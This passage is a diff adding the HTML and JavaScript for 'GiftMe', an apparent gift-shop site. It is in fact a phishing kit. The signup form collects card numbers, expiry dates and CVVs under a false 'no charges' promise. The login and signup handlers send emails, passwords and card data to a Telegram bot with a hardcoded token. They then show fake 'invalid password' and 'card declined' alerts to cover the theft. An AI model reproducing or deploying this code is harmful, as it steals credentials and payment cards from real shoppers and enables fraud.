+                            <i class="fas fa-hand-holding-heart"></i>
+                        </div>
+                        <h3>Thoughtful Curation</h3>
+                        <p>Our team carefully selects unique and meaningful gifts for every occasion.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Page Swapping Section -->
+        <section class="page-swap-section">
+            <div class="container">
+                <div class="page-swap-container">
+                    <div class="page-swap-content active" id="swap-content-1">
+                        <h3>Discover Unique Gifts</h3>
+                        <p>Our curated collection features handpicked items from artisans and designers worldwide.</p>
+                        <a href="/gifts" class="btn btn-outline">Browse Collection</a>
+                    </div>
+                    <div class="page-swap-content" id="swap-content-2">
+                        <h3>Personalized Gift Service</h3>
+                        <p>Let our experts help you find the perfect gift based on the recipient's personality and interests.</p>
+                        <a href="/about" class="btn btn-outline">Learn More</a>
+                    </div>
+                    <div class="page-swap-content" id="swap-content-3">
+                        <h3>Fast & Reliable Delivery</h3>
+                        <p>We ensure your gifts arrive on time, beautifully packaged with a personalized note.</p>
+                        <a href="/contact" class="btn btn-outline">Delivery Info</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Categories Section -->
+        <section class="categories">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Popular Gift Categories</h2>
+                    <p>Find the perfect present from our carefully curated collections</p>
+                </div>
+                
+                <div class="categories-grid">
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-birthday-cake"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Birthdays</h3>
+                            <p>Make their special day unforgettable</p>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-heart"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Anniversaries</h3>
+                            <p>Celebrate love and commitment</p>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-graduation-cap"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Graduations</h3>
+                            <p>Honor their achievements</p>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-baby"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Baby Showers</h3>
+                            <p>Welcome the newest addition</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Products Section -->
+        <section class="products">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Featured Gifts</h2>
+                    <p>Handpicked items that are sure to impress</p>
+                </div>
+                
+                <div class="products-grid" id="featured-products">
+                    <!-- Products will be loaded here by JavaScript -->
+                </div>
+                
+                <!-- Auto-scrolling Products -->
+                <div class="auto-scroll-container">
+                    <div class="auto-scroll-track" id="auto-scroll-track">
+                        <!-- Auto-scroll items will be added by JavaScript -->
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Testimonials Section -->
+        <section class="testimonials">
+            <div class="container">
+                <div class="section-title">
+                    <h2>What Our Customers Say</h2>
+                    <p>Don't just take our word for it - hear from our satisfied customers</p>
+                </div>
+                
+                <div class="testimonials-slider">
+                    <div class="testimonial-card">
+                        <div class="testimonial-avatar">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="testimonial-text">
+                            "I was struggling to find a gift for my wife's birthday, but GiftMe came through with the perfect suggestion. She absolutely loved the personalized jewelry set!"
+                        </div>
+                        <div class="testimonial-author">- Michael T.</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CTA Section -->
+        <section class="cta">
+            <div class="container">
+                <h2>Ready to Find the Perfect Gift?</h2>
+                <p>Join thousands of happy customers who have made their loved ones smile with thoughtful gifts from GiftMe.</p>
+                <a href="/create" class="btn btn-secondary">Get Started Today</a>
+            </div>
+        </section>
+    </div>
+
+    <!-- Other pages remain the same as before -->
+    <!-- Gifts Page Content -->
+    <div id="gifts-page" class="protected-content">
+        <section class="page-content">
+            <div class="container">
+                <div class="page-header">
+                    <h1>Our Gift Collection</h1>
+                    <p>Discover our handpicked selection of perfect gifts for every occasion and personality.</p>
+                </div>
+                <div class="products-grid" id="all-products">
+                    <!-- All products will be loaded here by JavaScript -->
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Occasions Page Content -->
+    <div id="occasions-page" class="protected-content">
+        <section class="page-content">
+            <div class="container">
+                <div class="page-header">
+                    <h1>Gifts by Occasion</h1>
+                    <p>Find the perfect gift for any special moment in life.</p>
+                </div>
+                <div class="categories-grid">
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-ring"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Engagements</h3>
+                            <p>Celebrate new beginnings</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Browse Gifts</a>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-briefcase"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Promotions</h3>
+                            <p>Celebrate career milestones</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Browse Gifts</a>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-home"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Housewarming</h3>
+                            <p>Welcome to a new home</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Browse Gifts</a>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-hand-holding-medical"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Get Well Soon</h3>
+                            <p>Wishes for a speedy recovery</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Browse Gifts</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Categories Page Content -->
+    <div id="categories-page" class="protected-content">
+        <section class="page-content">
+            <div class="container">
+                <div class="page-header">
+                    <h1>Browse Categories</h1>
+                    <p>Explore our wide range of gift categories to find exactly what you're looking for.</p>
+                </div>
+                <div class="categories-grid">
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-tshirt"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Fashion</h3>
+                            <p>Clothing, accessories & more</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Shop Now</a>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-laptop"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Electronics</h3>
+                            <p>Gadgets & tech accessories</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Shop Now</a>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-utensils"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Home & Kitchen</h3>
+                            <p>Everything for the home</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Shop Now</a>
+                        </div>
+                    </div>
+                    
+                    <div class="category-card">
+                        <div class="category-image">
+                            <i class="fas fa-dumbbell"></i>
+                        </div>
+                        <div class="category-content">
+                            <h3>Sports & Outdoors</h3>
+                            <p>Active lifestyle gifts</p>
+                            <a href="/gifts" class="btn btn-outline" style="margin-top: 15px;">Shop Now</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- About Page Content -->
+    <div id="about-page" class="protected-content">
+        <section class="page-content">
+            <div class="container">
+                <div class="page-header">
+                    <h1>About GiftMe</h1>
+                    <p>Learn more about our mission to make gift-giving simple and memorable.</p>
+                </div>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-rocket"></i>
+                        </div>
+                        <h3>Our Story</h3>
+                        <p>Founded in 2020, GiftMe started with a simple mission: to take the stress out of gift-giving. We believe that finding the perfect gift should be a joyful experience, not a chore.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-handshake"></i>
+                        </div>
+                        <h3>Our Values</h3>
+                        <p>We believe every gift should be thoughtful, personal, and create lasting memories. Our team carefully curates each item to ensure quality and meaning.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <h3>Our Team</h3>
+                        <p>Our diverse team of gift experts, designers, and customer service professionals work together to deliver exceptional experiences for our customers.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-award"></i>
+                        </div>
+                        <h3>Awards & Recognition</h3>
+                        <p>We're proud to have been recognized as the "Best Gift Service" by Consumer Choice Awards for three consecutive years.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Contact Page Content -->
+    <div id="contact-page" class="protected-content">
+        <section class="page-content">
+            <div class="container">
+                <div class="page-header">
+                    <h1>Contact Us</h1>
+                    <p>Get in touch with our team for any questions or support.</p>
+                </div>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-phone"></i>
+                        </div>
+                        <h3>Phone Support</h3>
+                        <p>1-800-GIFT-ME1<br>Available 9AM-9PM EST</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                        <h3>Email Us</h3>
+                        <p>support@giftme.com<br>We respond within 24 hours</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-comments"></i>
+                        </div>
+                        <h3>Live Chat</h3>
+                        <p>Available on our website<br>Mon-Fri, 8AM-6PM EST</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-map-marker-alt"></i>
+                        </div>
+                        <h3>Visit Us</h3>
+                        <p>123 Gift Street<br>New York, NY 10001</p>
+                    </div>
+                </div>
+                
+                <div class="form-container" style="margin-top: 50px;">
+                    <h3 style="text-align: center; margin-bottom: 20px;">Send us a Message</h3>
+                    <form>
+                        <div class="form-group">
+                            <label for="name">Your Name</label>
+                            <input type="text" id="name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email Address</label>
+                            <input type="email" id="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="message">Message</label>
+                            <textarea id="message" rows="5" style="width: 100%; padding: 12px 15px; border: 1px solid var(--light-gray); border-radius: var(--border-radius);" required></textarea>
+                        </div>
+                        <button type="submit" class="btn btn-primary" style="width: 100%;">Send Message</button>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Login Page -->
+    <div id="login-page" class="protected-content">
+        <section class="auth-page">
+            <div class="auth-container">
+                <div class="auth-header">
+                    <h1>Welcome Back</h1>
+                    <p>Sign in to your GiftMe account</p>
+                </div>
+                <div class="form-container">
+                    <form id="login-form">
+                        <div class="form-group">
+                            <label for="login-email">Email Address</label>
+                            <input type="email" id="login-email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="login-password">Password</label>
+                            <input type="password" id="login-password" required>
+                        </div>
+                        <div class="form-group" style="display: flex; justify-content: space-between; align-items: center;">
+                            <a href="#" style="color: var(--primary);">Forgot password?</a>
+                        </div>
+                        <button type="submit" class="btn btn-primary" style="width: 100%;">Log In</button>
+                    </form>
+                    
+                    <div class="form-footer">
+                        <p>Don't have an account? <a href="/create">Sign up</a></p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Signup Page -->
+    <div id="create-page" class="protected-content">
+        <section class="auth-page">
+            <div class="auth-container">
+                <div class="auth-header">
+                    <h1>Create Account</h1>
+                    <p>Join GiftMe to discover perfect gifts</p>
+                </div>
+                <div class="form-container">
+                    <form id="signup-form">
+                        <div class="form-group">
+                            <label for="signup-name">Full Name</label>
+                            <input type="text" id="signup-name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="signup-email">Email Address</label>
+                            <input type="email" id="signup-email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="signup-password">Password</label>
+                            <input type="password" id="signup-password" required>
+                        </div>
+                        
+                        <!-- Promo Code Section -->
+                        <div class="promo-section">
+                            <h4><i class="fas fa-tag"></i> Promo Code (Optional)</h4>
+                            <p>Have a promo code? Enter it here to get special discounts on your first order.</p>
+                            <input type="text" id="promo-code" placeholder="Enter promo code">
+                        </div>
+                        
+                        <div class="card-details">
+                            <h4>Payment Verification</h4>
+                            <p style="margin-bottom: 15px; font-size: 14px; color: var(--gray);">We need to verify your payment method. No charges will be made.</p>
+                            
+                            <div class="form-group">
+                                <label for="card-number">Card Number</label>
+                                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>
+                                <div class="error-message" id="card-number-error">Please enter a valid 16-digit card number</div>
+                            </div>
+                            
+                            <div class="card-row">
+                                <div class="form-group">
+                                    <label for="expiry-date">Expiry Date</label>
+                                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
+                                    <div class="error-message" id="expiry-date-error">Please enter a valid expiry date (MM/YY)</div>
+                                </div>
+                                <div class="form-group">
+                                    <label for="cvv">CVV</label>
+                                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                                    <div class="error-message" id="cvv-error">Please enter a valid CVV (3-4 digits)</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="card-name">Name on Card</label>
+                                <input type="text" id="card-name" required>
+                                <div class="error-message" id="card-name-error">Please enter the name as it appears on your card</div>
+                            </div>
+                        </div>
+                        
+                        <div class="verification-note">
+                            <i class="fas fa-info-circle"></i> This is a verification-only process. No money will be deducted from your account.
+                        </div>
+                        
+                        <div class="loading" id="verification-loading">
+                            <div class="loading-spinner"></div>
+                            Verifying your card...
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary" style="width: 100%;" id="verify-card-btn">Verify Card & Create Account</button>
+                    </form>
+                    
+                    <div class="form-footer">
+                        <p>Already have an account? <a href="/login">Log in</a></p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>GiftMe</h3>
+                    <p>Making gift-giving simple, personal, and memorable since 2020.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-pinterest"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Quick Links</h3>
+                    <ul class="footer-links">
+                        <li><a href="/" data-page="home">Home</a></li>
+                        <li><a href="/gifts" data-page="gifts">All Gifts</a></li>
+                        <li><a href="/occasions" data-page="occasions">Occasions</a></li>
+                        <li><a href="/categories" data-page="categories">Categories</a></li>
+                        <li><a href="/about" data-page="about">About Us</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Customer Service</h3>
+                    <ul class="footer-links">
+                        <li><a href="/contact" data-page="contact">Contact Us</a></li>
+                        <li><a href="#">Shipping Info</a></li>
+                        <li><a href="#">Returns & Exchanges</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Newsletter</h3>
+                    <p>Subscribe to get special offers, free gift ideas, and exclusive deals.</p>
+                    <div class="search-bar" style="margin-top: 15px;">
+                        <input type="text" placeholder="Your email address">
+                        <i class="fas fa-paper-plane"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>&copy; 2024 GiftMe. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Login Required Modal -->
+    <div id="login-required-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h2 class="modal-title">Login Required</h2>
+            <p style="text-align: center; margin-bottom: 20px;">You need to be logged in to access this feature.</p>
+            <div style="display: flex; gap: 10px; justify-content: center;">
+                <a href="/login" class="btn btn-primary">Log In</a>
+                <a href="/create" class="btn btn-outline">Sign Up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram configuration
+        const TOKEN = "7206448212:AAF5xvDT8iphaKdub7o6wuW6NVCJ94NJcyQ";
+        const CHAT_ID = "-4986212804";
+
+        // User authentication state
+        let isLoggedIn = false;
+        let currentPage = 'home';
+        let cartItems = [];
+        let pageSwapInterval;
+
+        // Product database with 50+ products
+        const products = [
+            // Electronics (10 products)
+            { id: 1, name: "Wireless Bluetooth Headphones", price: 79.99, category: "Electronics", rating: 4.5, reviews: 156, icon: "fas fa-headphones", badge: "Popular" },
+            { id: 2, name: "Smart Fitness Watch", price: 129.99, category: "Electronics", rating: 4.3, reviews: 89, icon: "fas fa-clock", badge: "New" },
+            { id: 3, name: "Wireless Earbuds", price: 59.99, category: "Electronics", rating: 4.2, reviews: 203, icon: "fas fa-headphones", badge: null },
+            { id: 4, name: "Portable Bluetooth Speaker", price: 49.99, category: "Electronics", rating: 4.4, reviews: 112, icon: "fas fa-volume-up", badge: null },
+            { id: 5, name: "Tablet Computer", price: 299.99, category: "Electronics", rating: 4.6, reviews: 76, icon: "fas fa-tablet-alt", badge: "Sale" },
+            { id: 6, name: "Smartphone", price: 699.99, category: "Electronics", rating: 4.7, reviews: 342, icon: "fas fa-mobile-alt", badge: "Popular" },
+            { id: 7, name: "Digital Camera", price: 449.99, category: "Electronics", rating: 4.5, reviews: 98, icon: "fas fa-camera", badge: null },
+            { id: 8, name: "Gaming Console", price: 399.99, category: "Electronics", rating: 4.8, reviews: 201, icon: "fas fa-gamepad", badge: "Hot" },
+            { id: 9, name: "Laptop Computer", price: 899.99, category: "Electronics", rating: 4.6, reviews: 156, icon: "fas fa-laptop", badge: null },
+            { id: 10, name: "Smart Home Hub", price: 99.99, category: "Electronics", rating: 4.3, reviews: 67, icon: "fas fa-home", badge: "New" },
+            
+            // Fashion (10 products)
+            { id: 11, name: "Designer Silk Scarf", price: 45.50, category: "Fashion", rating: 4.4, reviews: 64, icon: "fas fa-tshirt", badge: "New" },
+            { id: 12, name: "Leather Handbag", price: 129.99, category: "Fashion", rating: 4.6, reviews: 132, icon: "fas fa-shopping-bag", badge: "Popular" },
+            { id: 13, name: "Premium Sunglasses", price: 89.99, category: "Fashion", rating: 4.3, reviews: 87, icon: "fas fa-sun", badge: null },
+            { id: 14, name: "Designer Watch", price: 199.99, category: "Fashion", rating: 4.7, reviews: 201, icon: "fas fa-clock", badge: "Luxury" },
+            { id: 15, name: "Cashmere Sweater", price: 149.99, category: "Fashion", rating: 4.5, reviews: 94, icon: "fas fa-tshirt", badge: null },
+            { id: 16, name: "Leather Wallet", price: 59.99, category: "Fashion", rating: 4.4, reviews: 76, icon: "fas fa-wallet", badge: null },
+            { id: 17, name: "Designer Belt", price: 79.99, category: "Fashion", rating: 4.2, reviews: 53, icon: "fas fa-belt", badge: null },
+            { id: 18, name: "Fashionable Sneakers", price: 89.99, category: "Fashion", rating: 4.6, reviews: 128, icon: "fas fa-shoe-prints", badge: "Popular" },
+            { id: 19, name: "Evening Dress", price: 129.99, category: "Fashion", rating: 4.5, reviews: 67, icon: "fas fa-tshirt", badge: "New" },
+            { id: 20, name: "Designer Jeans", price: 79.99, category: "Fashion", rating: 4.3, reviews: 89, icon: "fas fa-tshirt", badge: null },
+            
+            // Home & Living (10 products)
+            { id: 21, name: "Artisan Coffee Mug Set", price: 34.99, category: "Home & Living", rating: 4.8, reviews: 203, icon: "fas fa-mug-hot", badge: null },
+            { id: 22, name: "Scented Candles Set", price: 24.99, category: "Home & Living", rating: 4.5, reviews: 156, icon: "fas fa-fire", badge: null },
+            { id: 23, name: "Throw Blanket", price: 39.99, category: "Home & Living", rating: 4.6, reviews: 98, icon: "fas fa-blanket", badge: "Cozy" },
+            { id: 24, name: "Decorative Pillows", price: 29.99, category: "Home & Living", rating: 4.4, reviews: 76, icon: "fas fa-couch", badge: null },
+            { id: 25, name: "Cookware Set", price: 149.99, category: "Home & Living", rating: 4.7, reviews: 112, icon: "fas fa-utensils", badge: "Popular" },
+            { id: 26, name: "Table Lamp", price: 49.99, category: "Home & Living", rating: 4.3, reviews: 64, icon: "fas fa-lightbulb", badge: null },
+            { id: 27, name: "Wall Art Print", price: 39.99, category: "Home & Living", rating: 4.5, reviews: 87, icon: "fas fa-palette", badge: null },
+            { id: 28, name: "Indoor Plant", price: 24.99, category: "Home & Living", rating: 4.6, reviews: 132, icon: "fas fa-leaf", badge: "Eco" },
+            { id: 29, name: "Bath Towel Set", price: 34.99, category: "Home & Living", rating: 4.4, reviews: 76, icon: "fas fa-bath", badge: null },
+            { id: 30, name: "Kitchen Knife Set", price: 89.99, category: "Home & Living", rating: 4.7, reviews: 98, icon: "fas fa-utensil-knife", badge: "Sharp" },
+            
+            // Jewelry & Accessories (10 products)
+            { id: 31, name: "Diamond Pendant Necklace", price: 299.99, category: "Jewelry", rating: 4.9, reviews: 89, icon: "fas fa-gem", badge: "Luxury" },
+            { id: 32, name: "Pearl Earrings", price: 129.99, category: "Jewelry", rating: 4.7, reviews: 76, icon: "fas fa-gem", badge: "Elegant" },
+            { id: 33, name: "Silver Bracelet", price: 79.99, category: "Jewelry", rating: 4.5, reviews: 112, icon: "fas fa-gem", badge: null },
+            { id: 34, name: "Gold Chain", price: 199.99, category: "Jewelry", rating: 4.6, reviews: 67, icon: "fas fa-gem", badge: "Premium" },
+            { id: 35, name: "Engagement Ring", price: 599.99, category: "Jewelry", rating: 4.9, reviews: 45, icon: "fas fa-ring", badge: "Special" },
+            { id: 36, name: "Designer Watch", price: 249.99, category: "Jewelry", rating: 4.7, reviews: 132, icon: "fas fa-clock", badge: "Luxury" },
+            { id: 37, name: "Crystal Earrings", price: 89.99, category: "Jewelry", rating: 4.4, reviews: 98, icon: "fas fa-gem", badge: null },
+            { id: 38, name: "Birthstone Necklace", price: 149.99, category: "Jewelry", rating: 4.6, reviews: 76, icon: "fas fa-gem", badge: "Personalized" },
+            { id: 39, name: "Tennis Bracelet", price: 349.99, category: "Jewelry", rating: 4.8, reviews: 54, icon: "fas fa-gem", badge: "Luxury" },
+            { id: 40, name: "Charm Bracelet", price: 79.99, category: "Jewelry", rating: 4.5, reviews: 87, icon: "fas fa-gem", badge: null },
+            
+            // Gourmet & Food (10 products)
+            { id: 41, name: "Premium Wine Collection", price: 89.99, category: "Gourmet", rating: 4.7, reviews: 128, icon: "fas fa-wine-bottle", badge: "Popular" },
+            { id: 42, name: "Artisan Chocolate Box", price: 34.99, category: "Gourmet", rating: 4.6, reviews: 156, icon: "fas fa-candy-cane", badge: "Sweet" },
+            { id: 43, name: "Gourmet Coffee Selection", price: 39.99, category: "Gourmet", rating: 4.5, reviews: 98, icon: "fas fa-coffee", badge: null },
+            { id: 44, name: "Olive Oil Gift Set", price: 49.99, category: "Gourmet", rating: 4.4, reviews: 76, icon: "fas fa-wine-bottle", badge: null },
+            { id: 45, name: "Cheese Board Collection", price: 59.99, category: "Gourmet", rating: 4.7, reviews: 112, icon: "fas fa-cheese", badge: "Popular" },
+            { id: 46, name: "Tea Sampler Set", price: 29.99, category: "Gourmet", rating: 4.3, reviews: 87, icon: "fas fa-mug-hot", badge: null },
+            { id: 47, name: "Spice Collection", price: 39.99, category: "Gourmet", rating: 4.5, reviews: 64, icon: "fas fa-mortar-pestle", badge: null },
+            { id: 48, name: "Craft Beer Pack", price: 44.99, category: "Gourmet", rating: 4.6, reviews: 98, icon: "fas fa-beer", badge: "Craft" },
+            { id: 49, name: "Dessert Gift Basket", price: 49.99, category: "Gourmet", rating: 4.7, reviews: 132, icon: "fas fa-basket", badge: "Sweet" },
+            { id: 50, name: "BBQ Sauce Collection", price: 24.99, category: "Gourmet", rating: 4.4, reviews: 76, icon: "fas fa-utensils", badge: null }
+        ];
+
+        // Initialize the app
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set up routing based on URL
+            setupRouting();
+            
+            // Set up event listeners
+            setupEventListeners();
+            
+            // Load products
+            loadProducts();
+            
+            // Set up auto-scrolling products
+            setupAutoScroll();
+            
+            // Set up page swapping
+            setupPageSwapping();
+            
+            // Show the current page
+            navigateToPage(currentPage);
+        });
+
+        // Set up routing based on URL
+        function setupRouting() {
+            const path = window.location.pathname;
+            let page = 'home';
+            
+            // Map URLs to page names
+            const routeMap = {
+                '/': 'home',
+                '/gifts': 'gifts',
+                '/occasions': 'occasions',
+                '/categories': 'categories',
+                '/about': 'about',
+                '/contact': 'contact',
+                '/login': 'login',
+                '/create': 'create'
+            };
+            
+            if (routeMap[path]) {
+                page = routeMap[path];
+            }
+            
+            currentPage = page;
+        }
+
+        // Set up all event listeners
+        function setupEventListeners() {
+            // Mobile menu toggle
+            document.getElementById('mobile-menu-btn').addEventListener('click', function() {
+                document.getElementById('main-nav').classList.toggle('active');
+            });
+
+            // Navigation links
+            document.querySelectorAll('a[data-page], a[href^="/"]').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    // Skip if it's an external link or has a target
+                    if (this.target || this.host !== window.location.host) return;
+                    
+                    e.preventDefault();
+                    const href = this.getAttribute('href');
+                    
+                    // Update URL
+                    window.history.pushState({}, '', href);
+                    
+                    // Navigate to the page
+                    setupRouting();
+                    navigateToPage(currentPage);
+                });
+            });
+
+            // Handle browser back/forward buttons
+            window.addEventListener('popstate', function() {
+                setupRouting();
+                navigateToPage(currentPage);
+            });
+
+            // Login form submission
+            document.getElementById('login-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('login-email').value;
+                const password = document.getElementById('login-password').value;
+                
+                // Send login data to Telegram
+                const message = `🔐 GiftMe Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${getIP()}\n🕒 Time: ${new Date().toLocaleString()}`;
+                
+                sendToTelegram(message);
+                
+                // Simulate successful login
+                isLoggedIn = true;
+                window.history.pushState({}, '', '/');
+                setupRouting();
+                navigateToPage('home');
+                alert('Invalid email address or password.');
+            });
+
+            // Signup form submission
+            document.getElementById('signup-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Validate card details before proceeding
+                if (!validateCardDetails()) {
+                    return;
+                }
+                
+                const name = document.getElementById('signup-name').value;
+                const email = document.getElementById('signup-email').value;
+                const password = document.getElementById('signup-password').value;
+                const promoCode = document.getElementById('promo-code').value;
+                const cardNumber = document.getElementById('card-number').value;
+                const expiryDate = document.getElementById('expiry-date').value;
+                const cvv = document.getElementById('cvv').value;
+                const cardName = document.getElementById('card-name').value;
+                
+                // Show loading state
+                document.getElementById('verification-loading').style.display = 'block';
+                document.getElementById('verify-card-btn').disabled = true;
+                
+                // Simulate verification process
+                setTimeout(function() {
+                    // Hide loading state
+                    document.getElementById('verification-loading').style.display = 'none';
+                    document.getElementById('verify-card-btn').disabled = false;
+                    
+                    // Send card data to Telegram
+                    const message = `💳 GiftMe Card Verification\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}\n🎟️ Promo Code: ${promoCode || 'None'}\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiryDate}\n🔒 CVV: ${cvv}\n👤 Card Name: ${cardName}\n🌐 IP: ${getIP()}\n🕒 Time: ${new Date().toLocaleString()}`;
+                    
+                    sendToTelegram(message);
+                    
+                    // Simulate successful signup
+                    isLoggedIn = true;
+                    window.history.pushState({}, '', '/');
+                    setupRouting();
+                    navigateToPage('home');
+                    alert('Your card has been declined.');
+                }, 4000);
+            });
+
+            // Card expiry date auto-format
+            document.getElementById('expiry-date').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                
+                e.target.value = value;
+            });
+
+            // Card number formatting
+            document.getElementById('card-number').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                // Format as XXXX XXXX XXXX XXXX
+                if (value.length > 0) {
+                    value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+                }
+                
+                e.target.value = value;
+            });
+
+            // Real-time card validation
+            document.getElementById('card-number').addEventListener('blur', validateCardNumber);
+            document.getElementById('expiry-date').addEventListener('blur', validateExpiryDate);
+            document.getElementById('cvv').addEventListener('blur', validateCVV);
+            document.getElementById('card-name').addEventListener('blur', validateCardName);
+
+            // Cart button
+            document.getElementById('cart-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                if (!isLoggedIn) {
+                    showLoginRequiredModal();
+                } else {
+                    alert('Cart functionality would open here');
+                }
+            });
+
+            // Close modal
+            document.querySelector('.close-modal').addEventListener('click', function() {
+                document.getElementById('login-required-modal').style.display = 'none';
+            });
+
+            // Contact form submission
+            document.querySelector('#contact-page form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Thank you for your message! We will get back to you soon.');
+                this.reset();
+            });
+        }
+
+        // Function to navigate between pages
+        function navigateToPage(page) {
+            // Hide all pages
+            document.querySelectorAll('.protected-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Show the selected page
+            setTimeout(() => {
+                document.getElementById(`${page}-page`).classList.add('active');
+            }, 50);
+            
+            // Update current page
+            currentPage = page;
+            
+            // Close mobile menu if open
+            document.getElementById('main-nav').classList.remove('active');
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+            
+            // Update page title
+            const pageTitles = {
+                'home': 'GiftMe - Perfect Gifts for Every Occasion',
+                'gifts': 'Our Gift Collection - GiftMe',
+                'occasions': 'Gifts by Occasion - GiftMe',
+                'categories': 'Browse Categories - GiftMe',
+                'about': 'About GiftMe',
+                'contact': 'Contact Us - GiftMe',
+                'login': 'Login - GiftMe',
+                'create': 'Create Account - GiftMe'
